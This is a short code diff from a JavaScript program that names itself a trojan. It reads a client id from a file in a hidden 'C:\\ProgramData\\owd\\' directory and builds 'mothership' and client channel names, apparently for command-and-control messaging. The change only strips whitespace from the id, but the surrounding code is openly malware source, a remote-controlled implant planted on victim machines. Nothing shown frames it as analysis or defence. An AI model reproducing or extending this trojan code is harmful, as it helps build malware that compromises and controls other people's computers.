@@ -24,7 +24,10 @@ function getRandomCode(n) {
 
 const enginename = 'JS'; // 'BAT'
 const trojandir = 'C:\\ProgramData\\owd\\';
-const clientid = fs.readFileSync(path.join(trojandir, 'client_id'), 'utf-8');
+let clientid = fs.readFileSync(path.join(trojandir, 'client_id'), 'utf-8');
+
+clientid = clientid.trim();
+clientid = clientid.replace(/\s/g, "");
 
 let mothership_channel = `clientid_${clientid}_${enginename}_mothership`;
 let client_channel = `clientid_${clientid}_${enginename}_client`;
